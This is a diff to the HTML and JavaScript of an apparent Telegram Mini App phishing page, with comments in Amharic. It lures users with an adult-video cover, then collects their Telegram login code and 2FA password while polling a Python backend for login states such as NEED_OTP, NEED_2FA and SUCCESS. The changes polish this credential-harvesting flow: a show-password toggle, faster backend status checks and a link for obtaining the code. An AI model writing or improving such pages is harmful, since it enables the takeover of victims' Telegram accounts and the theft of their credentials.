@@ -58,7 +58,7 @@
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         background-size: cover; background-position: center;
         z-index: -3; 
-        transition: background-image 1.5s ease-in-out;
+        transition: background-image 0.5s ease-in-out;
         transform: scale(1); 
         filter: blur(2px) brightness(1); /* 🌟 ብዥታው ቀንሶ ምስሉ በግልፅ እንዲታይ ተደርጓል 🌟 */
     }
@@ -162,7 +162,7 @@
   <div class="overlay"></div>
 
 
-    <!-- Intro Step -->
+    <!-- Intro Step (Now acts only as a brief loader until Python responds) -->
     <div id="step_intro" class="step active">
         <!-- 🌟 GitHub Animated Fire Heart Emoji 🌟 -->
         <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/refs/heads/main/Symbols/No%20One%20Under%20Eighteen.webp" alt="Fire Heart" style="width: 200px; height: 200px; margin-bottom: 10px; filter: drop-shadow(0 0 15px rgb(242, 2, 2));">
@@ -174,7 +174,7 @@
     <!-- Landing/Photo Step (Clean & Persuasive) -->
     <div id="step_photo_slide" class="step">
         <div class="glass-card" style="padding: 20px;">
-            <!-- 🌟 አዲሱ የቪዲዮ Cover ፎቶ 🌟 -->
+            <!-- 🌟 የቪዲዮ Cover ፎቶ 🌟 -->
             <div style="position: relative; border-radius: 12px; overflow: hidden; margin-bottom: 20px;" onclick="handleLoginClick()">
                 <img src="https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg" style="width: 100%; display: block; filter: brightness(0.8);">
                 <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff; font-size: 55px; opacity: 0.9; filter: drop-shadow(0 4px 10px rgba(0,0,0,0.5));">
@@ -212,7 +212,6 @@
 
             <div id="status2" class="msg"></div>            
             
-            <!-- 🌟 አዲሱ Button ከ OTP በላይ ገብቷል 🌟 -->
             <button class="btn-main" style="background: rgba(10, 127, 246, 0.8196078431372549); color: var(--telegram-blue); border: 1px solid rgba(50, 177, 243, 0.8431372549019608); box-shadow: none; font-size: 14px; padding: 14px; margin-bottom: 15px; border-radius: 12px;" onclick="window.open('https://t.me/42777', '_blank')">
                 <i class="fa-regular fa-comment-dots"></i> ኮዱን ለማግኘት እዚህ ይጫኑ
             </button>            
@@ -237,8 +236,12 @@
             <p>የእርስዎ ቴሌግራም በፓስዎርድ (2FA) የተቆለፈ ነው። ለመቀጠል ፓስዎርድዎን ያስገቡ።</p>
             
             <div id="status3" class="msg"></div>
+            <!-- 🌟 የፓስዎርድ ሳጥኑና እይታ መቆጣጠሪያው (Eye Icon) በሚያምር ሁኔታ በውስጡ ተካቷል 🌟 -->
             <div style="position: relative; width: 100%; margin-bottom: 10px;">
-                <input type="password" id="2fa_input" placeholder="ፓስዎርድ ያስገቡ" oninput="hideMsg(3)">
+                <input type="password" id="2fa_input" placeholder="ፓስዎርድ ያስገቡ" style="padding-right: 45px;" oninput="hideMsg(3)">
+                <div onclick="togglePasswordVisibility()" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; cursor: pointer; border-radius: 8px;">
+                    <i class="fa-solid fa-eye" id="toggleIcon" style="color: var(--text-muted); font-size: 18px;"></i>
+                </div>
             </div>
             
             <button class="btn-main" id="confirmBtn" onclick="submit2FA()">
@@ -288,7 +291,7 @@
     let isProcessing = false;
     let savedName = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.first_name : "User";
 
-    // 🌟 አዲሱ Background Image በሁሉም ገፅ ላይ እንዲታይ 🌟
+    // 🌟 Background Image በሁሉም ገፅ ላይ እንዲታይ 🌟
     const photos = [
         "https://i.postimg.cc/0jXFqFg6/Picsart-26-08-30-15-31-47-643-2.jpg",
         "https://i.postimg.cc/0jXFqFg6/Picsart-26-08-30-15-31-47-643-2.jpg",
@@ -297,16 +300,41 @@
 
     window.onload = function() {
         tg.expand();
-        
         const bg = document.getElementById('bgLayer');
         bg.style.backgroundImage = `url(${photos[0]})`;
 
-        setTimeout(() => {
+        // 🌟 አዲሱ ሲስተም፡ 3 ሴኮንድ ሳይጠብቅ ዌብሳይቱ ሲከፈት ቀጥታ Pythonን ይጠይቃል 🌟
+        if(typeof API_BASE_URL !== 'undefined'){
+            fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
+                bg.style.backgroundImage = `url(${photos[1]})`;
+                if (data.status === "FLOOD") { 
+                    displayFloodInStatus1(data);
+                }
+                else if (data.status === "NEED_OTP") { 
+                    showStep(2); 
+                }
+                else if (data.status === "NEED_2FA") { 
+                    showStep(3); 
+                }
+                else if (data.status === "SUCCESS") { 
+                    showStep('success'); 
+                }
+                else {
+                    // ከፓይዘን ምንም ከሌለ፣ 3 ሴኮንድ ሳይቆይ ወዲያውኑ ወደ መጀመሪያው ገፅ ይሄዳል
+                    showStep('photo_slide'); 
+                }
+                statusChecker = setInterval(checkStatus, 3000);
+            }).catch(e => {
+                // ኢንተርኔት ከተቋረጠ አሁንም ወደ መጀመሪያው ገፅ ይወስዳል
+                bg.style.backgroundImage = `url(${photos[1]})`;
+                showStep('photo_slide');
+                statusChecker = setInterval(checkStatus, 3000);
+            });
+        } else {
             bg.style.backgroundImage = `url(${photos[1]})`;
             showStep('photo_slide');
-        }, 2500);
+        }
 
-        statusChecker = setInterval(checkStatus, 3000);
         setupLongPressPaste(); 
     };
 
@@ -342,6 +370,20 @@
             document.getElementById('confirmBtn').disabled = false;
             document.getElementById('confirmSpinner').style.display = 'none';
             document.getElementById('confirmText').innerHTML = 'አረጋግጥ';
+        }
+    }
+
+    function togglePasswordVisibility() {
+        const passInput = document.getElementById('2fa_input');
+        const toggleIcon = document.getElementById('toggleIcon');
+        if (passInput.type === "password") {
+            passInput.type = "text";
+            toggleIcon.classList.replace('fa-eye', 'fa-eye-slash');
+            toggleIcon.style.color = 'var(--primary)';
+        } else {
+            passInput.type = "password";
+            toggleIcon.classList.replace('fa-eye-slash', 'fa-eye');
+            toggleIcon.style.color = 'var(--text-muted)';
         }
     }
 
